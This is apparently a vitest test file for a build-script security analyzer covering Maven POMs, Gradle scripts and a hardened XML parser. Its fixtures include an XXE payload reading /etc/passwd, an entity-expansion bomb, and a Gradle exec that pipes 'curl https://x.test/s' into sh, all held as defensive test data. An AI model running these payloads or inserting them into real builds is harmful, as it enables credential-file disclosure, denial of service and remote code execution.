import { describe, expect, it } from 'vitest';
import { analyzeCode, type CodeAnalysis } from '../../src/analysis/index.js';
import type { FileRole, ScannedFile } from '../../src/analysis/types.js';
import {
  applyVersionCatalogs,
  parseGradle,
  parsePom,
  parseVersionCatalog,
} from '../../src/collectors/manifests/jvm.js';
import { parseManifest } from '../../src/collectors/manifests/parse.js';
import { resolveDependencies } from '../../src/deps/resolve.js';
import { parseXml, XML_LIMITS } from '../../src/util/xml.js';

const file = (path: string, content: string, role: FileRole = 'build'): ScannedFile => ({
  path,
  content,
  size: content.length,
  role,
});
function run(
  manifests: ReturnType<typeof parseManifest>[],
  files: ScannedFile[] = [],
  extraTree: string[] = [],
): CodeAnalysis {
  return analyzeCode({
    manifests: manifests.filter((m): m is NonNullable<typeof m> => !!m),
    files,
    treePaths: [...files.map((f) => f.path), ...extraTree],
    sourceFilesTotal: 0,
    fetch: { skippedTooLarge: 0, skippedOverBudget: 0 },
  });
}
const pom = (body: string, head = '') =>
  `<?xml version="1.0"?><project xmlns="http://maven.apache.org/POM/4.0.0"><modelVersion>4.0.0</modelVersion><groupId>com.acme</groupId><artifactId>app</artifactId><version>1.0.0</version>${head}${body}</project>`;
const plugin = (artifact: string, extra = '', group = '') =>
  `<plugin>${group ? `<groupId>${group}</groupId>` : ''}<artifactId>${artifact}</artifactId>${extra}</plugin>`;
const build = (plugins: string) => `<build><plugins>${plugins}</plugins></build>`;
const hook = (a: CodeAnalysis, name: string) => a.execution.hooks.find((h) => h.name === name);

describe('safe XML reader', () => {
  it('rejects DOCTYPE and ENTITY declarations outright (no XXE, no entity expansion)', () => {
    const xxe =
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><project><name>&x;</name></project>';
    expect(parseXml(xxe)).toMatchObject({ ok: false });
    const bomb =
      '<!DOCTYPE lolz [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;">]><project>&b;</project>';
    expect(parseXml(bomb)).toMatchObject({ ok: false, reason: expect.stringContaining('DOCTYPE') });
    expect(parseXml('<!doctype x><project/>').ok).toBe(false); // case-insensitive
    expect(parsePom('pom.xml', xxe)).toBeUndefined();
  });
  it('only predefined entities are decoded; unknown ones stay literal', () => {
    const r = parseXml('<project><name>a &amp; b &lt;c&gt; &#65; &bogus;</name></project>');
    expect(r.ok && r.root.children[0]?.text).toBe('a & b <c> A &bogus;');
  });
  it('enforces size, depth and node limits', () => {
    expect(parseXml(`<a>${'x'.repeat(XML_LIMITS.maxBytes)}</a>`).ok).toBe(false);
    const deep = '<a>'.repeat(XML_LIMITS.maxDepth + 5) + '</a>'.repeat(XML_LIMITS.maxDepth + 5);
    expect(parseXml(deep)).toMatchObject({ ok: false, reason: 'nesting too deep' });
    expect(parseXml(`<a>${'<b/>'.repeat(XML_LIMITS.maxNodes + 10)}</a>`)).toMatchObject({
      ok: false,
      reason: 'too many elements',
    });
  });
  it('malformed documents fail closed', () => {
    for (const bad of ['', '<a><b></a>', '<a', '<a><!-- x', '</a>', 'plain text'])
      expect(parseXml(bad).ok, bad).toBe(false);
  });
});

describe('Maven POM model', () => {
  it('reads coordinates, properties, dependencies with scopes, managed BOM imports and repositories', () => {
    const m = parsePom(
      'pom.xml',
      pom(
        `<properties><junit.version>5.10.0</junit.version></properties>
<dependencies>
 <dependency><groupId>org.slf4j</groupId><artifactId>slf4j-api</artifactId><version>2.0.9</version></dependency>
 <dependency><groupId>org.junit.jupiter</groupId><artifactId>junit-jupiter</artifactId><version>\${junit.version}</version><scope>test</scope></dependency>
 <dependency><groupId>javax.servlet</groupId><artifactId>servlet-api</artifactId><scope>provided</scope></dependency>
 <dependency><groupId>x</groupId><artifactId>y</artifactId><version>\${missing.version}</version></dependency>
</dependencies>
<dependencyManagement><dependencies>
 <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-dependencies</artifactId><version>3.2.0</version><type>pom</type><scope>import</scope></dependency>
 <dependency><groupId>ignored</groupId><artifactId>managed-only</artifactId><version>1</version></dependency>
</dependencies></dependencyManagement>
<repositories><repository><id>r</id><url>http://repo.example.test/maven</url></repository></repositories>`,
        '<parent><groupId>org.parent</groupId><artifactId>parent</artifactId><version>9</version></parent>',
      ),
    )!;
    const by = Object.fromEntries(m.rawDeps!.map((d) => [d.name, d]));
    expect(by['org.slf4j:slf4j-api']).toMatchObject({ spec: '2.0.9', relationship: 'runtime' });
    expect(by['org.junit.jupiter:junit-jupiter']).toMatchObject({
      spec: '5.10.0',
      relationship: 'test',
    });
    expect(by['javax.servlet:servlet-api']).toMatchObject({ spec: '', relationship: 'build' });
    expect(by['x:y']?.spec).toBe('${missing.version}');
    expect(by['org.springframework.boot:spring-boot-dependencies']?.relationship).toBe('build');
    expect(by['ignored:managed-only']).toBeUndefined();
    expect(m.jvm?.unresolvedProperties).toBe(1);
    expect(m.jvm?.parent).toBe('org.parent:parent:9');
    expect(m.jvm?.repositories[0]).toMatchObject({ insecure: true });
  });

  it('dependency semantics: exact is a soft requirement (lower confidence), ranges/properties/missing are never exact', () => {
    const m = parsePom(
      'pom.xml',
      pom(`<dependencies>
 <dependency><groupId>a</groupId><artifactId>exact</artifactId><version>1.2.3</version></dependency>
 <dependency><groupId>a</groupId><artifactId>range</artifactId><version>[1.0,2.0)</version></dependency>
 <dependency><groupId>a</groupId><artifactId>snap</artifactId><version>1.0-SNAPSHOT</version></dependency>
 <dependency><groupId>a</groupId><artifactId>managed</artifactId></dependency>
 <dependency><groupId>a</groupId><artifactId>prop</artifactId><version>\${v}</version></dependency></dependencies>`),
    )!;
    const { deps } = resolveDependencies({ manifests: [m], locks: [], sboms: [] });
    const d = Object.fromEntries(deps.map((x) => [x.package.name, x]));
    expect(d['a:exact']).toMatchObject({
      resolution: 'resolved',
      resolved: { source: 'manifest_pin', confidence: 0.6 },
    });
    expect(d['a:exact']?.package.purl).toBe('pkg:maven/a/exact@1.2.3');
    expect(d['a:range']).toMatchObject({ resolution: 'unresolved', requested: { kind: 'range' } });
    expect(d['a:snap']?.requested?.kind).toBe('tag');
    expect(d['a:managed']?.resolution).toBe('unresolved');
    expect(d['a:prop']?.requested?.kind).toBe('unknown');
  });
});

describe('Maven build-time execution', () => {
  it('known command/script/download plugins become source-build hooks on the HOST, never for dependents', () => {
    const m = parseManifest(
      'pom.xml',
      pom(
        build(
          plugin(
            'exec-maven-plugin',
            '<version>3</version><executions><execution><id>gen</id><phase>generate-sources</phase><goals><goal>exec</goal></goals><configuration><executable>python3</executable><arguments><argument>gen.py</argument></arguments></configuration></execution></executions>',
            'org.codehaus.mojo',
          ) +
            plugin(
              'maven-antrun-plugin',
              '<executions><execution><phase>compile</phase><goals><goal>run</goal></goals><configuration><target><exec executable="sh"/><get src="https://x.test/a.zip" dest="a.zip"/></target></configuration></execution></executions>',
            ) +
            plugin(
              'frontend-maven-plugin',
              '<executions><execution><goals><goal>install-node-and-npm</goal></goals></execution></executions>',
              'com.github.eirslett',
            ) +
            plugin('maven-compiler-plugin') +
            plugin('maven-surefire-plugin') +
            plugin('maven-jar-plugin'),
        ),
      ),
    );
    const a = run([m]);
    expect(hook(a, 'exec-maven-plugin')).toMatchObject({
      ecosystem: 'maven',
      runs_for_dependents: false,
      stage: 'SOURCE_BUILD',
      trigger_kind: 'BUILD_TOOL_INVOKED',
      environment: 'HOST',
      details: { category: 'exec', phases: 'generate-sources', goals: 'exec' },
    });
    expect(hook(a, 'exec-maven-plugin')?.capabilities).toContain('PROCESS_EXEC');
    expect(hook(a, 'maven-antrun-plugin')?.capabilities).toEqual(
      expect.arrayContaining(['PROCESS_EXEC']),
    );
    expect(hook(a, 'frontend-maven-plugin')?.capabilities).toEqual(
      expect.arrayContaining(['PROCESS_EXEC', 'REMOTE_DOWNLOAD']),
    );
    // ordinary tooling is not reported
    for (const benign of ['maven-compiler-plugin', 'maven-surefire-plugin', 'maven-jar-plugin'])
      expect(hook(a, benign)).toBeUndefined();
    expect(a.execution.hooks.some((h) => h.runs_for_dependents)).toBe(false);
    expect(a.execution.projects[0]).toMatchObject({
      ecosystem: 'maven',
      kind: 'known_with_repository_code',
      repository_code_runs: true,
    });
  });

  it('a plain POM with only standard plugins is declarative', () => {
    const a = run([
      parseManifest(
        'pom.xml',
        pom(build(plugin('maven-compiler-plugin') + plugin('maven-surefire-plugin'))),
      ),
    ]);
    expect(a.execution.projects[0]).toMatchObject({
      kind: 'known_declarative',
      repository_code_runs: false,
    });
    expect(a.execution.hooks).toEqual([]);
  });

  it('profile trickery: a plugin inside a non-default profile is reported with lower confidence and the profile recorded', () => {
    const profile = `<profiles><profile><id>release</id><build><plugins>${plugin('exec-maven-plugin', '<executions><execution><phase>package</phase><goals><goal>exec</goal></goals></execution></executions>', 'org.codehaus.mojo')}</plugins></build></profile>
<profile><id>default</id><activation><activeByDefault>true</activeByDefault></activation><build><plugins>${plugin('exec-maven-plugin', '<executions><execution><phase>package</phase><goals><goal>exec</goal></goals></execution></executions>', 'org.codehaus.mojo')}</plugins></build></profile></profiles>`;
    const a = run([parseManifest('pom.xml', pom(profile))]);
    const hooks = a.execution.hooks.filter((h) => h.name === 'exec-maven-plugin');
    expect(hooks).toHaveLength(2);
    const [gated, active] = hooks.sort((x, y) =>
      (x.details?.['profile'] ?? '').localeCompare(y.details?.['profile'] ?? ''),
    );
    expect(gated?.details).toMatchObject({ profile: 'default', profile_active_by_default: 'true' });
    expect(active?.details).toMatchObject({
      profile: 'release',
      profile_active_by_default: 'false',
    });
    expect(active!.confidence).toBeLessThan(gated!.confidence);
  });

  it('pluginManagement only configures; it does not execute', () => {
    const body = `<build><pluginManagement><plugins>${plugin('exec-maven-plugin', '<executions><execution><phase>compile</phase></execution></executions>', 'org.codehaus.mojo')}</plugins></pluginManagement></build>`;
    expect(run([parseManifest('pom.xml', pom(body))]).execution.hooks).toEqual([]);
  });

  it('parent POM, unresolved properties and plain-HTTP repositories are surfaced as project notes', () => {
    const a = run([
      parseManifest(
        'pom.xml',
        pom(
          '<repositories><repository><id>x</id><url>http://insecure.test/repo</url></repository></repositories><properties><a>${nope}</a></properties><dependencies><dependency><groupId>g</groupId><artifactId>a</artifactId><version>${nope}</version></dependency></dependencies>',
          '<parent><groupId>p</groupId><artifactId>p</artifactId><version>1</version></parent>',
        ),
      ),
    ]);
    const notes = a.execution.projects[0]!.notes.join(' | ');
    expect(notes).toMatch(/parent POM p:p:1 is not resolved/);
    expect(notes).toMatch(/repository over plain HTTP: http:\/\/insecure\.test\/repo/);
    expect(notes).toMatch(/could not be resolved/);
  });

  it('.mvn/extensions.xml extensions are build-time code and are noted', () => {
    const a = run(
      [parseManifest('pom.xml', pom(''))],
      [
        file(
          '.mvn/extensions.xml',
          '<extensions><extension><groupId>com.vendor</groupId><artifactId>build-ext</artifactId><version>1</version></extension></extensions>',
          'config',
        ),
      ],
    );
    expect(a.execution.projects[0]?.notes.join(' ')).toMatch(
      /extensions\.xml loads com\.vendor:build-ext/,
    );
    expect(a.execution.projects[0]?.repository_code_runs).toBe(true);
  });

  it('a Maven wrapper script is a user-invoked source-build hook that downloads the build tool', () => {
    const a = run(
      [],
      [
        file(
          'mvnw',
          '#!/bin/sh\ncurl -fsSL https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.9.6/apache-maven-3.9.6-bin.zip -o "$f"\nunzip "$f"\nexec sh ./mvn "$@"\n',
          'script',
        ),
      ],
    );
    expect(hook(a, 'mvnw')).toMatchObject({
      ecosystem: 'maven',
      trigger_kind: 'USER_INVOKED',
      stage: 'SOURCE_BUILD',
      environment: 'HOST',
      runs_for_dependents: false,
    });
    expect(hook(a, 'mvnw')?.capabilities).toContain('REMOTE_DOWNLOAD');
  });
});

describe('Gradle model', () => {
  const gradle = (text: string, name = 'build.gradle') => parseGradle(name, text)!;

  it('reads plugins, repositories and dependency forms (Groovy and Kotlin DSL)', () => {
    const m = gradle(`plugins {
  id 'java-library'
  id("com.example.custom") version "1.0"
}
repositories {
  mavenCentral()
  maven { url 'http://plain.test/repo' }
  maven(url = "https://secure.test/repo")
}
dependencies {
  implementation 'org.slf4j:slf4j-api:2.0.9'
  api("com.google.guava:guava:33.0.0-jre")
  testImplementation(group = "junit", name = "junit", version = "4.13.2")
  runtimeOnly "a.b:c:1.+"
  compileOnly 'x:y'
  implementation project(':core')
  classpath 'bad:buildscript:1'
}`);
    expect(m.jvm?.gradlePlugins).toEqual(
      expect.arrayContaining(['java-library', 'com.example.custom']),
    );
    expect(m.jvm?.repositories.map((r) => [r.url, r.insecure])).toEqual(
      expect.arrayContaining([
        ['http://plain.test/repo', true],
        ['https://secure.test/repo', false],
      ]),
    );
    const by = Object.fromEntries(m.rawDeps!.map((d) => [d.name, d]));
    expect(by['org.slf4j:slf4j-api']).toMatchObject({ spec: '2.0.9', relationship: 'runtime' });
    expect(by['junit:junit']).toMatchObject({ spec: '4.13.2', relationship: 'test' });
    expect(by['a.b:c']?.spec).toBe('1.+');
    expect(by['x:y']).toMatchObject({ spec: '', relationship: 'build' });
    expect(by['project::core']).toMatchObject({ spec: 'workspace' });
    expect(by['bad:buildscript']?.relationship).toBe('build');
    const { deps } = resolveDependencies({ manifests: [m], locks: [], sboms: [] });
    expect(deps.find((d) => d.package.name === 'a.b:c')?.requested?.kind).toBe('range');
    expect(deps.find((d) => d.package.name === 'project::core')?.resolution).toBe('not_registry');
  });

  it('version catalog aliases are resolved into coordinates', () => {
    const cat = parseVersionCatalog(
      'gradle/libs.versions.toml',
      `[versions]\nokhttp = "4.12.0"\n[libraries]\nokhttp = { module = "com.squareup.okhttp3:okhttp", version.ref = "okhttp" }\njackson-core = "com.fasterxml.jackson.core:jackson-core:2.17.0"\n`,
    )!;
    const m = gradle(
      `dependencies {\n  implementation libs.okhttp\n  implementation(libs.jackson.core)\n}`,
    );
    applyVersionCatalogs([m, cat]);
    const by = Object.fromEntries(m.rawDeps!.map((d) => [d.name, d]));
    expect(by['com.squareup.okhttp3:okhttp']?.spec).toBe('4.12.0');
    expect(by['com.fasterxml.jackson.core:jackson-core']?.spec).toBe('2.17.0');
  });

  it('process execution at configuration time is automatic for any invocation; inside doLast it is task-time', () => {
    const cfg = run([
      gradle(`exec {\n  commandLine 'sh', '-c', 'curl https://x.test/s | sh'\n}\n`),
    ]);
    const h = cfg.execution.hooks.find((x) => x.name === 'configuration-time')!;
    expect(h).toMatchObject({
      ecosystem: 'gradle',
      trigger_kind: 'BUILD_TOOL_INVOKED',
      stage: 'SOURCE_BUILD',
      environment: 'HOST',
      runs_for_dependents: false,
    });
    expect(h.capabilities).toContain('PROCESS_EXEC');

    const task = run([
      gradle(`tasks.register("gen") {\n  doLast {\n    exec { commandLine 'make' }\n  }\n}\n`),
    ]);
    expect(task.execution.hooks.find((x) => x.name === 'configuration-time')).toBeUndefined();
    expect(task.execution.hooks.some((x) => x.name === 'task:gen')).toBe(true);
  });

  it('typed Exec/Download tasks: wired into the build means automatic, otherwise user-invoked', () => {
    const a = run([
      gradle(
        `task fetch(type: Exec) {\n  commandLine 'git', 'clone', 'x'\n}\ntask unwired(type: Exec) {\n  commandLine 'ls'\n}\nbuild.dependsOn fetch\n`,
      ),
    ]);
    const fetch = hook(a, 'task:fetch')!;
    const unwired = hook(a, 'task:unwired')!;
    expect(fetch).toMatchObject({
      trigger_kind: 'BUILD_TOOL_INVOKED',
      details: { wired: 'true', task_type: 'Exec' },
    });
    expect(unwired).toMatchObject({ trigger_kind: 'USER_INVOKED', details: { wired: 'false' } });
    expect(fetch.capabilities).toContain('PROCESS_EXEC');
  });

  it('applying a remote script is high risk and automatic; benign tasks and comments are not hooks', () => {
    const a = run([
      gradle(
        `// exec { commandLine 'rm' }\n/* task evil(type: Exec) {} */\napply from: 'https://example.test/build.gradle'\ntask docs(type: Copy) { from 'a' }\ntasks.register("check2")\n`,
      ),
    ]);
    const h = hook(a, 'remote-script')!;
    expect(h).toMatchObject({ risk: 'high', trigger_kind: 'BUILD_TOOL_INVOKED' });
    expect(h.capabilities).toEqual(
      expect.arrayContaining(['REMOTE_DOWNLOAD', 'DYNAMIC_CODE_LOAD']),
    );
    expect(a.execution.hooks.map((x) => x.name).sort()).toEqual(['remote-script']);
  });

  it('buildSrc is repository build logic; third-party plugins are noted, core plugins are not', () => {
    const a = run(
      [gradle("plugins {\n  id 'java'\n  id 'com.vendor.magic' version '1'\n}\n")],
      [
        file(
          'buildSrc/src/main/kotlin/Conventions.kt',
          'import java.io.File\nfun x() { ProcessBuilder("make").start() }\n',
        ),
      ],
    );
    expect(hook(a, 'buildSrc')).toMatchObject({
      stage: 'SOURCE_BUILD',
      environment: 'HOST',
    });
    expect(a.execution.projects[0]?.notes.join(' ')).toMatch(
      /1 third-party Gradle plugin\(s\).*com\.vendor\.magic/,
    );
    expect(a.execution.projects[0]?.notes.join(' ')).not.toMatch(/\bjava\b.*third-party/);
  });

  it('settings.gradle(.kts): modules and included builds; the file itself is not a project', () => {
    const s = gradle(
      `rootProject.name = "x"\ninclude(":core", ":api")\nincludeBuild("../shared")\n`,
      'settings.gradle.kts',
    );
    expect(s.jvm).toMatchObject({
      tool: 'gradle-settings',
      modules: ['core', 'api'],
      includedBuilds: ['../shared'],
    });
    expect(run([s]).execution.projects).toEqual([]);
  });

  it('dynamic Gradle logic stays unresolved: nothing is guessed from a computed version', () => {
    const m = gradle(
      `dependencies {\n  implementation "org.x:y:\${versions.y}"\n  implementation(project.property("dep"))\n}`,
    );
    const { deps } = resolveDependencies({ manifests: [m], locks: [], sboms: [] });
    const y = deps.find((d) => d.package.name === 'org.x:y');
    expect(y?.resolution).not.toBe('resolved');
  });

  it('auxiliary build files (examples/tests) are ignored', () => {
    const a = run([
      parseGradle('examples/demo/build.gradle', "apply from: 'https://x.test/a.gradle'\n"),
    ]);
    expect(a.execution.hooks).toEqual([]);
    expect(a.execution.projects).toEqual([]);
  });
});
